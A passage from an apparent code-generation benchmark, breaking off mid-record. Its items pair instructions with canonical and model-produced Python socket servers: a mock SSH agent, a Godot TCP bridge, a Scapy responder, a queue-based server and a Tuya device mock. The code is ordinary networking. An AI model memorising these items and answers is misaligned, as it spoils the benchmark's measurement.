    "Canonical_solution": "import socket\nimport threading\nimport time\n\nclass MiniTestServer:\n    def __init__(self, stay_silent=False, proto=\"tcp\", host=\"0.0.0.0\"):\n        self.server_socket = None\n        self.received = None\n        self.data_to_send = b\"\\xfe\\xeb\\xda\\xed\"\n        self.active_port = None\n        self.stay_silent = stay_silent\n        self.proto = proto\n        self.host = host\n        self.timeout = 5\n\n    def bind(self):\n        if self.proto == \"tcp\":\n            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        elif self.proto == \"udp\":\n            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n        elif self.proto == \"raw\":\n            self.server_socket = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))\n        else:\n            raise Exception(\"Invalid protocol type: '{0}'\".format(self.proto))\n\n        self.server_socket.bind((self.host, 0))\n        if self.proto == \"tcp\":\n            self.server_socket.listen(1)\n        self.active_port = self.server_socket.getsockname()[1]\n\n    def serve_once(self):\n        self.server_socket.settimeout(self.timeout)\n\n        if self.proto == \"tcp\":\n            (client_socket, address) = self.server_socket.accept()\n            self.received = client_socket.recv(10000)\n            if not self.stay_silent:\n                client_socket.send(self.data_to_send)\n            client_socket.close()\n        elif self.proto == \"udp\":\n            data, addr = self.server_socket.recvfrom(1024)\n            self.received = data\n            if not self.stay_silent:\n                self.server_socket.sendto(self.data_to_send, addr)\n        elif self.proto == \"raw\":\n            data, addr = self.server_socket.recvfrom(10000)\n            self.received = data\n            if not self.stay_silent:\n                self.server_socket.sendto(self.data_to_send, addr)\n        else:\n            raise Exception(\"Invalid protocol type: '{0}'\".format(self.proto))\n\n        self.server_socket.close()\n        self.server_socket = None\n        self.active_port = None\n\n    def receive_until(self, expected):\n        self.server_socket.settimeout(self.timeout)\n\n        if self.proto == \"raw\":\n            elapsed_time = 0\n            start_time = time.time()\n            while elapsed_time < self.timeout:\n                self.server_socket.settimeout(self.timeout - elapsed_time)\n                try:\n                    data, addr = self.server_socket.recvfrom(10000)\n                    if data == expected:\n                        self.received = data\n                        if not self.stay_silent:\n                            self.server_socket.sendto(self.data_to_send, addr)\n                        break\n                except socket.timeout:\n                    break\n                elapsed_time = time.time() - start_time\n        else:\n            raise Exception(\"Invalid protocol type: '{0}'\".format(self.proto))\n\n        self.server_socket.close()\n        self.server_socket = None\n        self.active_port = None",
    "Code_level": "Class-level",
    "FSMID_for_test": 66,
    "right_result": "import socket\nimport struct\nimport time\n\nclass MiniTestServer:\n    def __init__(self, stay_silent=False, proto=\"tcp\", host=\"0.0.0.0\"):\n        self.server_socket = None\n        self.received = b\"\"\n        self.data_to_send = b\"\\xfe\\xeb\\xda\\xed\"\n        self.active_port = 0\n        self.stay_silent = stay_silent\n        self.proto = proto.lower()\n        self.host = host\n        self.timeout = 5\n\n    def bind(self):\n        if self.proto == \"tcp\":\n            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n            self.server_socket.bind((self.host, 0))\n            self.active_port = self.server_socket.getsockname()[1]\n            self.server_socket.listen(1)\n        elif self.proto == \"udp\":\n            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n            self.server_socket.bind((self.host, 0))\n            self.active_port = self.server_socket.getsockname()[1]\n        elif self.proto == \"raw\":\n            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)\n            self.server_socket.settimeout(self.timeout)\n            self.active_port = 0  # Raw sockets don't use ports\n        else:\n            raise ValueError(\"Unsupported protocol\")\n\n    def serve_once(self):\n        self.received = b\"\"\n        if self.proto == \"tcp\":\n            client_socket, addr = self.server_socket.accept()\n            try:\n                self.received = client_socket.recv(65535)\n                if not self.stay_silent:\n                    client_socket.sendall(self.data_to_send)\n            finally:\n                client_socket.close()\n        elif self.proto == \"udp\":\n            data, addr = self.server_socket.recvfrom(65535)\n            self.received = data\n            if not self.stay_silent:\n                self.server_socket.sendto(self.data_to_send, addr)\n        elif self.proto == \"raw\":\n            while True:\n                data, addr = self.server_socket.recvfrom(65535)\n                self.received = data\n                if not self.stay_silent:\n                    self.server_socket.sendto(self.data_to_send, addr)\n                break\n\n    def receive_until(self, expected):\n        if self.proto != \"raw\":\n            raise Exception(\"receive_until is only available for RAW protocol\")\n        self.received = b\"\"\n        start_time = time.time()\n        while True:\n            try:\n                data, addr = self.server_socket.recvfrom(65535)\n                self.received += data\n                if expected in self.received:\n                    break\n                if time.time() - start_time > self.timeout:\n                    raise socket.timeout(\"Timeout waiting for pattern\")\n            except socket.timeout:\n                raise"
  },
  {
    "Task_id": 378,
    "Instruction": "Task Description: Implement a mock SSH agent that simulates the behavior of a real SSH agent, handling client requests for key management and authentication. The agent should support Unix domain sockets for IPC and provide functionality to start, stop, and manage client connections.\n\nClass Description: The `MockSSHAgent` class simulates an SSH agent that can load an ED25519 private key, handle client connections, and respond to SSH agent protocol requests. It uses threading to handle multiple clients and supports graceful shutdown.\n\nAttributes:\n\n- `sock_path`: [str] - The path to the Unix domain socket used for communication.\n- `server_sock`: [socket.socket] - The server socket object for accepting client connections.\n- `running`: [threading.Event] - A threading event to control the agent's running state.\n- `keys`: [list] - A list of tuples containing key information (key_type, key_blob, comment).\n- `agent_thread`: [threading.Thread] - The thread handling client connections.\n\nMethods:\n\n- `_load_ed25519_private_key(private_key_path: str) -> tuple`: Loads an ED25519 private key from a file and returns a tuple containing key information (key_type, key_blob, comment).\n- `start_agent(sock_path: str) -> None`: Starts the SSH agent by creating a Unix domain socket, binding it, and listening for client connections. Sets the `SSH_AUTH_SOCK` environment variable.\n- `_accept_connections() -> None`: Continuously accepts client connections and delegates handling to `_handle_client`.\n- `_handle_client(client_sock: socket.socket) -> None`: Handles a client connection by processing incoming messages and sending appropriate responses.\n- `_mock_list_keys_response() -> bytes`: Constructs a mock response to the `SSH_AGENTC_REQUEST_IDENTITIES` request.\n- `stop_agent() -> None`: Stops the SSH agent by sending a stop command, cleaning up resources, and removing the socket file.",
    "Canonical_solution": "import os\nimport socket\nimport struct\nimport threading\nfrom cryptography.hazmat.primitives import serialization\nfrom cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey\n\nSSH_AGENTC_REQUEST_IDENTITIES = 11\nSSH_AGENT_IDENTITIES_ANSWER = 12\nSSH_AGENT_FAILURE = 5\nSTOP_REQUEST = 0xFF\n\nclass MockSSHAgent:\n    def __init__(self, private_key_path):\n        self.sock_path = None\n        self.server_sock = None\n        self.running = threading.Event()\n        self.keys = [self._load_ed25519_private_key(private_key_path)]\n        self.agent_thread = None\n\n    def _load_ed25519_private_key(self, private_key_path):\n        with open(private_key_path, 'rb') as key_file:\n            private_key = serialization.load_ssh_private_key(key_file.read(), password=None)\n\n        if not isinstance(private_key, Ed25519PrivateKey):\n            raise ValueError(\"Invalid key type, expected ED25519 private key.\")\n\n        public_key = private_key.public_key()\n        public_key_blob = public_key.public_bytes(\n            encoding=serialization.Encoding.Raw, format=serialization.PublicFormat.Raw\n        )\n\n        key_type = b\"ssh-ed25519\"\n        key_blob_full = (\n            struct.pack(\">I\", len(key_type))\n            + key_type\n            + struct.pack(\">I\", len(public_key_blob))\n            + public_key_blob\n        )\n\n        comment = \"\"\n        return (\"ssh-ed25519\", key_blob_full, comment)\n\n    def start_agent(self, sock_path):\n        self.sock_path = sock_path\n        if os.path.exists(self.sock_path):\n            os.remove(self.sock_path)\n\n        self.server_sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)\n        self.server_sock.bind(self.sock_path)\n        self.server_sock.listen(5)\n\n        os.environ['SSH_AUTH_SOCK'] = self.sock_path\n        self.running.set()\n\n        self.agent_thread = threading.Thread(target=self._accept_connections, daemon=True)\n        self.agent_thread.start()\n\n    def _accept_connections(self):\n        while self.running.is_set():\n            try:\n                client_sock, _ = self.server_sock.accept()\n                self._handle_client(client_sock)\n            except Exception as e:\n                print(f\"Error accepting connection: {e}\")\n\n    def _handle_client(self, client_sock):\n        try:\n            length_message = client_sock.recv(4)\n            if not length_message:\n                raise \"no length message received\"\n\n            msg_len = struct.unpack(\">I\", length_message)[0]\n            request_message = client_sock.recv(msg_len)\n\n            if request_message[0] == STOP_REQUEST:\n                client_sock.close()\n                self.running.clear()\n                return\n\n            if request_message[0] == SSH_AGENTC_REQUEST_IDENTITIES:\n                response = self._mock_list_keys_response()\n                client_sock.sendall(response)\n            else:\n                response = struct.pack(\">I\", 1) + struct.pack(\">B\", SSH_AGENT_FAILURE)\n                client_sock.sendall(response)\n\n        except socket.error:\n            pass\n        finally:\n            client_sock.close()\n\n    def _mock_list_keys_response(self):\n        response = struct.pack(\">B\", SSH_AGENT_IDENTITIES_ANSWER)\n        response += struct.pack(\">I\", len(self.keys))\n\n        for key_type, key_blob, comment in self.keys:\n            response += struct.pack(\">I\", len(key_blob)) + key_blob\n            comment_encoded = comment.encode()\n            response += struct.pack(\">I\", len(comment_encoded)) + comment_encoded\n\n        response = struct.pack(\">I\", len(response)) + response\n        return response\n\n    def stop_agent(self):\n        if self.running.is_set():\n            with socket.socket(socket.AF_UNIX, socket.SOCK_STREAM) as client_sock:\n                client_sock.connect(self.sock_path)\n                stop_command = struct.pack(\">B\", STOP_REQUEST)\n                message_length = struct.pack(\">I\", len(stop_command))\n                client_sock.sendall(message_length)\n                client_sock.sendall(stop_command)\n\n            self.running.clear()\n\n            if self.agent_thread:\n                self.agent_thread.join()\n                self.agent_thread = None\n\n            if self.server_sock:\n                self.server_sock.close()\n                os.remove(self.sock_path)",
    "Code_level": "Class-level",
    "FSMID_for_test": 66,
    "right_result": "import os\nimport socket\nimport threading\nfrom pathlib import Path\nfrom typing import Tuple, List\n\nclass MockSSHAgent:\n    def __init__(self):\n        self.sock_path = \"\"\n        self.server_sock: socket.socket = None\n        self.running = threading.Event()\n        self.keys: List[Tuple[str, bytes, str]] = []\n        self.agent_thread: threading.Thread = None\n\n    def _load_ed25519_private_key(self, private_key_path: str) -> tuple:\n        with open(private_key_path, \"rb\") as f:\n            key_data = f.read()\n        return (\"ssh-ed25519\", key_data, \"mock_comment\")\n\n    def start_agent(self, sock_path: str) -> None:\n        self.sock_path = sock_path\n        if Path(sock_path).exists():\n            Path(sock_path).unlink()\n        \n        self.server_sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)\n        self.server_sock.bind(sock_path)\n        self.server_sock.listen(5)\n        \n        os.environ[\"SSH_AUTH_SOCK\"] = sock_path\n        \n        self.running.set()\n        self.agent_thread = threading.Thread(target=self._accept_connections)\n        self.agent_thread.start()\n\n    def _accept_connections(self) -> None:\n        while self.running.is_set():\n            try:\n                client_sock, _ = self.server_sock.accept()\n                client_handler = threading.Thread(target=self._handle_client, args=(client_sock,))\n                client_handler.start()\n            except BlockingIOError:\n                continue\n\n    def _handle_client(self, client_sock: socket.socket) -> None:\n        try:\n            while self.running.is_set():\n                request = client_sock.recv(1024)\n                if not request:\n                    break\n                \n                msg_type = request[0]\n                \n                if msg_type == 11:  # SSH_AGENTC_REQUEST_IDENTITIES\n                    response = self._mock_list_keys_response()\n                    client_sock.sendall(response)\n                else:\n                    pass\n        finally:\n            client_sock.close()\n\n    def _mock_list_keys_response(self) -> bytes:\n        response = bytearray()\n        response.append(12)  # SSH_AGENT_IDENTITIES_ANSWER\n        \n        total_keys = len(self.keys)\n        response.extend(total_keys.to_bytes(4, 'big'))\n        \n        for key_type, key_blob, comment in self.keys:\n            response.extend(len(key_blob).to_bytes(4, 'big'))\n            response.extend(key_blob)\n            response.extend(len(comment).to_bytes(4, 'big'))\n            response.extend(comment.encode())\n        \n        return bytes(response)\n\n    def stop_agent(self) -> None:\n        self.running.clear()\n        \n        if self.server_sock:\n            self.server_sock.close()\n            self.server_sock = None\n        \n        if self.agent_thread and self.agent_thread.is_alive():\n            self.agent_thread.join()\n        \n        if Path(self.sock_path).exists():\n            Path(self.sock_path).unlink()"
  },
  {
    "Task_id": 379,
    "Instruction": "Task Description: Implement a TCP communication class to facilitate data exchange between a Python server and a Godot client using JSON format for message serialization.\n\nClass Description: GodotTCPCommunicator is a TCP server implementation that handles communication with a Godot client. It establishes a connection, sends/receives JSON-formatted messages, and manages the connection lifecycle.\n\nAttributes:\n- port: int - The port number on which the server listens for connections (default: 11008)\n- connection: socket.socket - The active TCP connection with the client\n- DEFAULT_PORT: int - Class constant for default port (11008)\n- DEFAULT_TIMEOUT: int - Class constant for default timeout in seconds (60)\n\nMethods:\n- __init__(port: int = DEFAULT_PORT) -> None - Initializes the communicator with specified port and starts the server\n- _start_server() -> socket.socket - Creates and configures TCP socket, binds to localhost, listens for and accepts connection\n- _send_as_json(dictionary: Dict[str, Any]) -> None - Serializes dictionary to JSON and sends it to client\n- _get_json_dict() -> Dict[str, Any] - Receives data from client and deserializes JSON to dictionary\n- _get_data() -> Optional[str] - Receives raw string data from client with length-prefix protocol\n- _send_string(string: str) -> None - Sends string to client with length-prefix protocol\n- close() -> None - Closes the active connection",
    "Canonical_solution": "import socket\nimport json\nfrom typing import Optional, Dict, Any\nimport numpy as np\n\nclass GodotTCPCommunicator:\n    DEFAULT_PORT = 11008\n    DEFAULT_TIMEOUT = 60\n\n    def __init__(self, port: int = DEFAULT_PORT):\n        self.port = port\n        self.connection = self._start_server()\n\n    def _start_server(self):\n        print(f\"waiting for remote GODOT connection on port {self.port}\")\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        server_address = (\"127.0.0.1\", self.port)\n        sock.bind(server_address)\n        sock.listen(1)\n        sock.settimeout(self.DEFAULT_TIMEOUT)\n        connection, client_address = sock.accept()\n        print(\"connection established\")\n        return connection\n\n    def _send_as_json(self, dictionary: Dict[str, Any]):\n        message_json = json.dumps(dictionary)\n        self._send_string(message_json)\n\n    def _get_json_dict(self) -> Dict[str, Any]:\n        data = self._get_data()\n        return json.loads(data)\n\n    def _get_data(self) -> Optional[str]:\n        try:\n            string_size_bytes = bytearray()\n            received_length = 0\n            length = 4\n\n            while received_length < length:\n                data = self.connection.recv(length - received_length)\n                received_length += len(data)\n                string_size_bytes.extend(data)\n\n            length = int.from_bytes(string_size_bytes, \"little\")\n\n            string_bytes = bytearray()\n            received_length = 0\n\n            while received_length < length:\n                data = self.connection.recv(length - received_length)\n                received_length += len(data)\n                string_bytes.extend(data)\n\n            return string_bytes.decode()\n        except socket.timeout as e:\n            print(\"env timed out\", e)\n            return None\n\n    def _send_string(self, string: str):\n        message = len(string).to_bytes(4, \"little\") + bytes(string.encode())\n        self.connection.sendall(message)\n\n    def close(self):\n        self.connection.close()",
    "Code_level": "Class-level",
    "FSMID_for_test": 66,
    "right_result": "import socket\nimport json\nfrom typing import Dict, Any, Optional\n\nclass GodotTCPCommunicator:\n    DEFAULT_PORT = 11008\n    DEFAULT_TIMEOUT = 60\n\n    def __init__(self, port: int = DEFAULT_PORT) -> None:\n        self.port = port\n        self.connection = self._start_server()\n\n    def _start_server(self) -> socket.socket:\n        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        server_socket.bind(('localhost', self.port))\n        server_socket.listen(1)\n        server_socket.settimeout(self.DEFAULT_TIMEOUT)\n        conn, addr = server_socket.accept()\n        conn.settimeout(self.DEFAULT_TIMEOUT)\n        return conn\n\n    def _send_as_json(self, dictionary: Dict[str, Any]) -> None:\n        json_data = json.dumps(dictionary)\n        self._send_string(json_data)\n\n    def _get_json_dict(self) -> Dict[str, Any]:\n        data = self._get_data()\n        if data is None:\n            return {}\n        return json.loads(data)\n\n    def _get_data(self) -> Optional[str]:\n        try:\n            length_prefix = self.connection.recv(4)\n            if not length_prefix:\n                return None\n            length = int.from_bytes(length_prefix, byteorder='big')\n            return self.connection.recv(length).decode('utf-8')\n        except (socket.timeout, ConnectionError, ValueError, json.JSONDecodeError):\n            return None\n\n    def _send_string(self, string: str) -> None:\n        encoded = string.encode('utf-8')\n        length_prefix = len(encoded).to_bytes(4, byteorder='big')\n        self.connection.sendall(length_prefix + encoded)\n\n    def close(self) -> None:\n        self.connection.close()"
  },
  {
    "Task_id": 380,
    "Instruction": "Task Description: Implement a TCP server that can handle multiple client connections, process incoming packets, and send replies asynchronously using Python's socket module and Scapy's networking capabilities.\n\nClass Description: AnsweringMachineTCP is a TCP server implementation that listens on a specified port, accepts client connections, and processes incoming packets using Scapy's packet handling capabilities. It supports asynchronous packet sniffing and reply generation for each connected client.\n\nAttributes:\nport: [int] - The port number on which the server listens for incoming connections\ncls: [Type[Packet]] - The Scapy packet class used for parsing incoming data\noptsniff: [dict] - Dictionary of additional options for the sniffer configuration\nsniffer: [threading.Thread] - Background thread running the sniffing process\n\nMethods:\n__init__(port=80, cls=conf.raw_layer, **kargs) -> [None] - Initializes the answering machine with specified port, packet class, and additional options\nclose() -> [None] - Closes all resources (placeholder implementation)\nreply(pkt, send_function=None, address=None) -> [None] - Processes incoming packets and sends replies if appropriate\nsniff() -> [None] - Main server loop that accepts connections and starts sniffers for each client\nsniff_bg() -> [None] - Starts the sniffing process in a background thread\nis_request(req) -> [bool] - Determines if a packet should be processed (default always True)\nmake_reply(req, address=None) -> [Packet] - Generates a reply packet (default returns input packet)\nsend_reply(reply, send_function=None) -> [None] - Sends the generated reply to the client",
    "Canonical_solution": "import socket\nfrom typing import Optional, Type, Any\nfrom scapy.arch import get_if_addr\nfrom scapy.config import conf\nfrom scapy.packet import Packet\nfrom scapy.supersocket import StreamSocket\nimport functools\nfrom scapy.sendrecv import AsyncSniffer\n\nclass AnsweringMachineTCP:\n    \"\"\"\n    An answering machine that use the classic socket.socket to\n    answer multiple TCP clients\n    \"\"\"\n    TYPE = socket.SOCK_STREAM\n\n    def __init__(self, port=80, cls=conf.raw_layer, **kargs):\n        self.port = port\n        self.cls = cls\n        self.optsniff = kargs\n\n    def close(self):\n        pass\n\n    def reply(self, pkt, send_function=None, address=None):\n        if not self.is_request(pkt):\n            return\n        if address:\n            reply = self.make_reply(pkt, address=address)\n        else:\n            reply = self.make_reply(pkt)\n        if not reply:\n            return\n        if send_function:\n            self.send_reply(reply, send_function=send_function)\n        else:\n            self.send_reply(reply)\n\n    def sniff(self):\n        ssock = socket.socket(socket.AF_INET, self.TYPE)\n        try:\n            ssock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        except OSError:\n            pass\n        ssock.bind(\n            (get_if_addr(self.optsniff.get(\"iface\", conf.iface)), self.port))\n        ssock.listen()\n        sniffers = []\n        try:\n            while True:\n                clientsocket, address = ssock.accept()\n                sock = StreamSocket(clientsocket, self.cls)\n                optsniff = self.optsniff.copy()\n                optsniff[\"prn\"] = functools.partial(self.reply,\n                                                    send_function=sock.send,\n                                                    address=address)\n                del optsniff[\"iface\"]\n                sniffer = AsyncSniffer(opened_socket=sock, **optsniff)\n                sniffer.start()\n                sniffers.append((sniffer, sock))\n        finally:\n            for (sniffer, sock) in sniffers:\n                try:\n                    sniffer.stop()\n                except Exception:\n                    pass\n                sock.close()\n            self.close()\n            ssock.close()\n\n    def sniff_bg(self):\n        self.sniffer = threading.Thread(target=self.sniff)\n        self.sniffer.start()\n\n    def is_request(self, req):\n        return 1\n\n    def make_reply(self, req, address=None):\n        return req\n\n    def send_reply(self, reply, send_function=None):\n        if send_function:\n            send_function(reply)",
    "Code_level": "Class-level",
    "FSMID_for_test": 66,
    "right_result": "import socket\nfrom threading import Thread, Event\nfrom scapy.packet import Packet\nfrom scapy.config import conf\n\nclass AnsweringMachineTCP:\n    def __init__(self, port=80, cls=conf.raw_layer, **kargs):\n        self.port = port\n        self.cls = cls\n        self.optsniff = kargs.get('optsniff', {})\n        self.sniffer = None\n        self.clients = []\n        self.running = False\n\n    def close(self):\n        pass\n\n    def reply(self, pkt, send_function=None, address=None):\n        if not self.is_request(pkt):\n            return\n        reply_pkt = self.make_reply(pkt, address)\n        if reply_pkt is not None:\n            self.send_reply(reply_pkt, send_function)\n\n    def sniff(self):\n        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:\n            server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n            server_socket.bind(('0.0.0.0', self.port))\n            server_socket.listen(5)\n            self.running = True\n            while self.running:\n                client_socket, addr = server_socket.accept()\n                client_handler = Thread(target=self.handle_client, args=(client_socket, addr))\n                client_handler.start()\n                self.clients.append((client_socket, addr, client_handler))\n\n    def sniff_bg(self):\n        self.sniffer = Thread(target=self.sniff)\n        self.sniffer.daemon = True\n        self.sniffer.start()\n\n    def handle_client(self, client_socket, address):\n        try:\n            while True:\n                data = client_socket.recv(65535)\n                if not data:\n                    break\n                pkt = self.cls(data)\n                self.reply(pkt, lambda p: client_socket.send(p.build()), address)\n        finally:\n            client_socket.close()\n            self.clients = [c for c in self.clients if (c[0], c[1]) != (client_socket, address)]\n\n    def is_request(self, req):\n        return True\n\n    def make_reply(self, req, address=None):\n        return req\n\n    def send_reply(self, reply, send_function=None):\n        if send_function:\n            send_function(reply)"
  },
  {
    "Task_id": 381,
    "Instruction": "Task Description: Create a TCP server class that can handle incoming client connections, receive data from clients in a line-based and length-prefixed format, and process the received data in a separate thread.\n\nClass Description: BaseSocket is a TCP server implementation that listens for incoming connections, receives data from clients, and queues the received data for processing. It uses threading to handle connections asynchronously and provides methods for data reception and processing.\n\nAttributes:\nserversocket: [socket.socket] - TCP socket object for server operations\nqueue: [Queue] - Thread-safe queue for storing received data\nt: [Thread] - Thread object for running the server's main loop\ndebug: [bool] - Flag for enabling debug mode\ndisconnect: [bool] - Flag indicating client disconnection status\n\nMethods:\n__init__: [host: str, port: int, debug: bool = False] -> None - Initializes the TCP server, binds to the specified host and port, and starts the server thread\nrecvLine: [sock: socket.socket] -> Tuple[bool, str] - Static method that receives a line of data ending with newline character from a socket\nrecvAll: [sock: socket.socket, l: str] -> str - Static method that receives exact number of bytes specified by length parameter l from a socket\nrun: [] -> None - Main server loop that accepts connections and receives data from clients\nupdate: [] -> None - Processes queued data by calling the main method\nmain: [datas: str] -> None - Placeholder method for processing received data (should be overridden by subclasses)\n__del__: [] -> None - Cleanup method that closes the server socket and joins the thread",
    "Canonical_solution": "import socket\nimport time\nfrom threading import Thread\nfrom queue import Queue\n\nclass BaseSocket:\n    def __init__(self, host, port, debug=False) -> None:\n        self.serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.serversocket.bind((host, port))\n        self.serversocket.listen(1)\n        self.queue = Queue()\n        self.t = Thread(target=self.run)\n        self.t.start()\n        self.debug = debug\n        self.disconnect = False\n    \n    @staticmethod\n    def recvLine(sock):\n        flag = True\n        result = b''\n        while not result.endswith(b'\\n'):\n            res = sock.recv(1)\n            if not res:\n                flag = False\n                break\n            result += res\n        return flag, result.strip().decode('ascii')\n\n    @staticmethod\n    def recvAll(sock, l):\n        l = int(l)\n        result = b''\n        while (len(result) < l):\n            t = sock.recv(l - len(result))\n            result += t\n        return result.decode('ascii')\n\n    def run(self):\n        while True:\n            clientsocket, addr = self.serversocket.accept()\n            self.disconnect = False\n            while True:\n                flag, l = self.recvLine(clientsocket)\n                if not flag:\n                    self.disconnect = True\n                    break\n                data = self.recvAll(clientsocket, l)\n                self.queue.put(data)\n            clientsocket.close()\n    \n    def update(self):\n        time.sleep(1)\n        while not self.queue.empty():\n            data = self.queue.get()\n            self.main(data)\n    \n    def main(self, datas):\n        pass\n\n    def __del__(self):\n        self.serversocket.close()\n        self.t.join()",
    "Code_level": "Class-level",
    "FSMID_for_test": 66,
    "right_result": "import socket\nimport threading\nimport struct\nfrom queue import Queue\n\nclass BaseSocket:\n    def __init__(self, host: str, port: int, debug: bool = False):\n        self.serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.serversocket.bind((host, port))\n        self.serversocket.listen(5)\n        self.queue = Queue()\n        self.debug = debug\n        self.disconnect = False\n        self.t = threading.Thread(target=self.run)\n        self.t.daemon = True\n        self.t.start()\n\n    @staticmethod\n    def recvLine(sock: socket.socket) -> (bool, str):\n        data = b\"\"\n        while True:\n            char = sock.recv(1)\n            if not char:\n                return False, \"\"\n            data += char\n            if data.endswith(b\"\\n\"):\n                break\n        return True, data.decode(\"utf-8\")\n\n    @staticmethod\n    def recvAll(sock: socket.socket, l: str) -> str:\n        data = b\"\"\n        length = int(l)\n        while len(data) < length:\n            packet = sock.recv(length - len(data))\n            if not packet:\n                return \"\"\n            data += packet\n        return data.decode(\"utf-8\")\n\n    def run(self):\n        while True:\n            clientsocket, addr = self.serversocket.accept()\n            if self.debug:\n                print(f\"Connection from {addr}\")\n            try:\n                while True:\n                    success, line = BaseSocket.recvLine(clientsocket)\n                    if not success:\n                        break\n                    line = line.strip()\n                    if not line:\n                        continue\n                    if line.isdigit():\n                        data = BaseSocket.recvAll(clientsocket, line)\n                        if data:\n                            self.queue.put(data)\n                    else:\n                        self.queue.put(line)\n                clientsocket.close()\n            except Exception as e:\n                if self.debug:\n                    print(f\"Error: {e}\")\n            if self.disconnect:\n                break\n\n    def update(self):\n        while not self.queue.empty():\n            datas = self.queue.get()\n            self.main(datas)\n\n    def main(self, datas: str):\n        pass\n\n    def __del__(self):\n        self.serversocket.close()\n        self.t.join()"
  },
  {
    "Task_id": 382,
    "Instruction": "Task Description: Implement a TCP server for handling Tuya smart device communication, including session key negotiation and device state query responses.\n\nFunction Description: The function establishes a TCP server that listens for incoming Tuya device connections, handles secure session key negotiation, and responds to device state queries. It maintains communication security through HMAC verification and AES encryption.\n\nInput:\n- None (uses module-level constants: bind_host, bind_port, real_key)\n\nOutput:\n- None (continuously runs as a server, maintains active connections and handles client communication)\n\nKey Operations:\n1. Creates an IPv6 TCP socket with SO_REUSEADDR option\n2. Binds to specified host/port and listens for connections\n3. Uses select() for non-blocking I/O multiplexing\n4. Handles three message types:\n   - SESS_KEY_NEG_START: Initiates secure session negotiation\n   - SESS_KEY_NEG_FINISH: Completes session key exchange\n   - DP_QUERY_NEW: Responds to device state queries with mock data\n5. Maintains sequence numbers and temporary keys for each session\n6. Automatically closes stale connections\n\nSecurity Features:\n- HMAC-SHA256 for message authentication\n- AES encryption for session keys\n- Nonce-based key exchange protocol\n\nError Handling:\n- Automatically recovers from client disconnections\n- Handles malformed messages with error responses\n- Maintains connection state between messages",
    "Canonical_solution": "import socket\nimport select\nimport time\nimport json\nfrom hashlib import sha256\nimport hmac\nimport tinytuya\n\nbind_host = ''\nbind_port = 6668\nreal_key = b'thisisarealkey00'\n\ndef handle_tuya_communication():\n    srv = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)\n    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n    srv.bind((bind_host, bind_port))\n    srv.listen(1)\n\n    client = None\n    tmp_key = real_key\n    seqno = 1\n    local_nonce = str(time.time() * 1000000)[:16].encode('utf8')\n\n    while True:\n        r = [srv]\n        if client:\n            r.append(client)\n        w = []\n        x = []\n\n        r, w, x = select.select(r, w, x, 1)\n\n        for sock in r:\n            if sock is srv:\n                if client:\n                    client.close()\n                    client = None\n                client, addr = sock.accept()\n                client.setblocking(False)\n                tmp_key = real_key\n                seqno = 1\n                continue\n\n            if sock is not client:\n                continue\n\n            data = sock.recv(4096)\n            if not data:\n                client.close()\n                client = None\n                continue\n\n            m = tinytuya.unpack_message(data, hmac_key=tmp_key, no_retcode=True)\n\n            if m.cmd == tinytuya.SESS_KEY_NEG_START:\n                tmp_key = real_key\n                payload = m.payload\n                remote_nonce = payload\n                miv = remote_nonce[:12]\n                hmac_check = hmac.new(real_key, remote_nonce, sha256).digest()\n                msg = tinytuya.TuyaMessage(seqno, tinytuya.SESS_KEY_NEG_RESP, 0, local_nonce+hmac_check, 0, True, tinytuya.PREFIX_6699_VALUE, True)\n                seqno += 1\n                data = tinytuya.pack_message(msg, hmac_key=tmp_key)\n                client.sendall(data)\n            elif m.cmd == tinytuya.SESS_KEY_NEG_FINISH:\n                rkey_hmac = hmac.new(real_key, local_nonce, sha256).digest()\n                tmp_key = bytes([a^b for (a,b) in zip(remote_nonce,local_nonce)])\n                cipher = tinytuya.AESCipher(real_key)\n                tmp_key = cipher.encrypt(tmp_key, use_base64=False, pad=False, iv=miv)[12:28]\n            elif m.cmd == tinytuya.DP_QUERY_NEW:\n                resp = {'protocol': 4, 't': int(time.time()), 'data': {'dps': {'20': True, '21': 'white', '22': 946, '23': 3, '24': '014a03e803a9', '25': '04464602007803e803e800000000464602007803e8000a00000000', '26': 0, '34': False}}}\n                msg = tinytuya.TuyaMessage(seqno, 16, 0, json.dumps(resp).encode('ascii'), 0, True, tinytuya.PREFIX_6699_VALUE, True)\n                seqno += 1\n                data = tinytuya.pack_message(msg, hmac_key=tmp_key)\n                client.sendall(data)\n            else:\n                msg = tinytuya.TuyaMessage(seqno, 16, 0, b'json obj data unvalid', 0, True, tinytuya.PREFIX_6699_VALUE, True)\n                seqno += 1\n                data = tinytuya.pack_message(msg, hmac_key=tmp_key)\n                client.sendall(data)",
    "Code_level": "Function-level",
    "FSMID_for_test": 66,
